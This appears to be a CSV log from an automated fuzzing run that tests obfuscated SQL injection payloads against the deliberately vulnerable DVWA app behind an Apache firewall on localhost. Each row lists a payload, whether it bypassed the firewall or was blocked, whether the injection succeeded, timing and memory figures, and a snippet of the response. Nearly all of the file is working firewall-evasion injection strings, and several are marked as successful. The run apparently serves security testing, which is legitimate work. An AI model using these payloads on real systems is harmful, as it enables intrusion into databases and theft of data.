Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1.+or%0bnot%7efalse=%0b(!%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.041,70.31,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+0=+(!%0b{x%0b(select%0b1)}=1)--+,Bypassed,No,None,Invalid,0.0145,70.44,No,500,
0%27<@!=1+||+!~0=%0b(false)+or',Bypassed,No,None,Invalid,0.0498,70.44,No,500,
0'<@=1.%0bor%0bnot+true=+(!+{x+(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0158,70.44,No,500,
0%27<@=1.%0bor+not%0btrue=%0b(!+{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0365,70.44,No,500,
0%27||%0b!@<@.+or+{x%0b(select%0b1)}=1+like%0btrue%0bor',Bypassed,No,None,Invalid,0.0357,70.44,No,500,
0%27<@=1%0b||+{x+(select+1)}=1+like+{a%0b1}=1%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0421,70.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+!+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0274,70.44,No,500,
0%27<@=.1+or+!%0b{`if`%0b1}=1=+(not+{`if`+1}=1)%0bor',Bypassed,No,None,Invalid,0.0264,70.44,No,500,
0%27<@=1.+||%0bnot+{x+(select%0b1)}=1=+(not%7efalse)--+,Blocked,No,None,Invalid,0.0164,70.44,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or%0bnot%0b{`if`%0b1}=1=%0b(not+{a%0b1}=1)%0b||%27,Bypassed,No,None,Invalid,0.0233,70.44,No,500,
0'<@=1%0bor+!%0b{x+(select+1)}=1=+(not+1)%23,Bypassed,No,None,Invalid,0.0323,70.44,No,500,
0'<@=.1%0bor%0bnot%0b{x%0b(select+1)}=1=+(not%0btrue)+or%27,Bypassed,No,None,Invalid,0.051,70.69,No,500,
0%27<@!=.1%0bor+not+true=%0b(not%0b{x+(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0325,70.95,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||%0b!+{a%0b1}=1=+(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Invalid,0.0574,70.95,No,500,
0%27<@=1.%0b||+{`if`+1}=1%0blike%0b{x%0b(select+1)}=1--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0273,70.95,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+not%7e0=%0b(not%0b1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0198,70.95,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0352,69.57,No,500,
0%27<@=.1+or+!%0btrue=%0b(not+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0319,70.08,No,500,
0%27<@=1%0b||+not%0b{a%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0323,70.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||+not%0b{a+1}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.024,70.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+not+{`if`%0b1}=1=+(!%0b{a+1}=1)%0b||',Bypassed,No,None,Invalid,0.0318,70.08,No,500,
0%27<@!=.1+||+!+true=+(!%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0282,70.13,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+true=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.032,70.19,No,500,
0%27<@!=.1+||+not%0b{a+1}=1=+(0)--+,Blocked,No,None,Invalid,0.0349,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+{x+(select%0b1)}=1%0blike%0b{x%0b(select+1)}=1+or',Blocked,No,None,Invalid,0.0223,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+!+{x+(select+1)}=1=%0b(!%0btrue)%0b||%27,Bypassed,No,None,Invalid,0.0256,70.19,No,500,
0'<@=1.+or%0bnot+{`if`%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)--+,Bypassed,No,None,Invalid,0.0133,70.19,No,500,
0%27<@=.1%0b||%0bnot+{`if`+1}=1=+(!%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0273,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+not+{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0291,70.19,No,500,
0'<@!=1.+or+!+{`if`%0b1}=1=+(!+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0174,70.19,No,500,
0%27<@=1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0285,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+{x%0b(select%0b1)}=1+like%0b{`if`%0b1}=1+||',Bypassed,No,None,Invalid,0.0204,70.19,No,500,
0'<@=.1+||+!%0b{`if`%0b1}=1=%0b(not+{x+(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0223,70.19,No,500,
0%27<@=.1%0b||%0b!%0b1=+(!%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Invalid,0.0182,70.19,No,500,
0%27<@!=.1%0b||+{x%0b(select%0b1)}=1+like+true+||',Bypassed,No,None,Invalid,0.0236,70.19,No,500,
0'<@=1.+or%0bnot%0b{`if`+1}=1=%0b(not%0b{a%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.0146,70.19,No,500,
0'or+1<@.+or%0b!%0b{x%0b(select+1)}=1=+(!%0b1)+or%27,Bypassed,No,None,Invalid,0.0439,70.19,No,500,
0'<@=1.%0b||%0b{x+(select%0b1)}=1+like%0b{`if`+1}=1--+,Bypassed,No,None,Invalid,0.063,70.19,No,500,
0%27<@=1.%0bor+!%7efalse=+(!+1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0392,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0bnot%0b{`if`+1}=1=%0b(not~false)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0386,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0bnot%0b{x+(select+1)}=1=+(not~0)+or',Bypassed,No,None,Invalid,0.0131,70.19,No,500,
0%27<@=1+||%0bnot+{x%0b(select%0b1)}=1%0bis+false+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0182,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||%0b!+{`if`+1}=1=%0b(not+{`if`+1}=1)%0bor',Bypassed,No,None,Invalid,0.0232,70.19,No,500,
0%27<@!=1+||+not+{x%0b(select%0b1)}=1=+(not%0b{`if`%0b1}=1)+or',Bypassed,No,None,Invalid,0.0518,70.19,No,500,
0%27<@!=.1+||%0b!%0b{x%0b(select+1)}=1=%0b(not+true)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0167,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or%0b0=%0b(!+{x+(select+1)}=1)--%0b,Blocked,No,None,Invalid,0.032,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0b||%0b!%0b1=%0b(!%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0262,70.19,No,500,
0%27<@!=1+||%0bnot%7e0=+(!+{x+(select+1)}=1)--+,Blocked,No,None,Invalid,0.0093,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+not+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0246,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+{a+1}=1=+(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Invalid,0.0163,70.19,No,500,
0'<@=1%0bor%0b!+{x+(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0342,70.19,No,500,
0'<@!=1%0bor+not%0b{x%0b(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0267,70.19,No,500,
0'<@!=1+||+not+{a+1}=1=+(!+{`if`%0b1}=1)--%0b,Bypassed,No,None,Invalid,0.0271,70.19,No,500,
0'<@!=.1%0bor+not%0btrue=%0b(!%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0271,70.19,No,500,
0'<@!=1.+or+!+{`if`%0b1}=1=+(!%0btrue)--%0b,Bypassed,No,None,Invalid,0.0313,70.44,No,500,
0%27<@!=1+or+not%0b{x%0b(select+1)}=1+is%0bfalse--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0371,70.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+{x%0b(select%0b1)}=1+like%0b{x%0b(select%0b1)}=1+||',Bypassed,No,None,Invalid,0.0355,70.44,No,500,
0'<@=.1+or%0b!%0b{x%0b(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)%23,Blocked,No,None,Invalid,0.0198,70.44,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or+!%0btrue=%0b(not+{x%0b(select%0b1)}=1)%23,Bypassed,No,None,Invalid,0.0186,70.44,No,500,
0%27<@!=1%0bor+not+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0226,70.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0b!+{x%0b(select+1)}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Invalid,0.0467,70.44,No,500,
0'<@!=1%0bor+not+{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1)--%0b,Bypassed,No,None,Invalid,0.0327,70.44,No,500,
0%27<@!=.1%0b||+!%0b{x+(select+1)}=1=+(not%0b{x%0b(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0225,70.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+not+{`if`%0b1}=1=+(!%0b{a+1}=1)%0bor',Bypassed,No,None,Invalid,0.0407,70.44,No,500,
0'<@=1+||+not%0b{x+(select%0b1)}=1=%0b(not~false)+||',Bypassed,No,None,Invalid,0.0445,70.44,No,500,
0'<@!=.1+or+!+{x+(select+1)}=1=+(not%0b{a+1}=1)%0bor%27,Blocked,No,None,Invalid,0.0147,70.44,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or%0bnot%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)--+,Blocked,No,None,Invalid,0.0457,69.72,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+not+{x+(select+1)}=1=+(!~false)%0bor%27,Bypassed,No,None,Invalid,0.0421,70.08,No,500,
0%27<@!=1+or+!+true=+(not+{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0606,70.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot%7efalse=%0b(!+{a+1}=1)--%0b,Blocked,No,None,Invalid,0.0217,70.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||+!%0b{x+(select%0b1)}=1=%0b(not~0)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0428,70.13,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
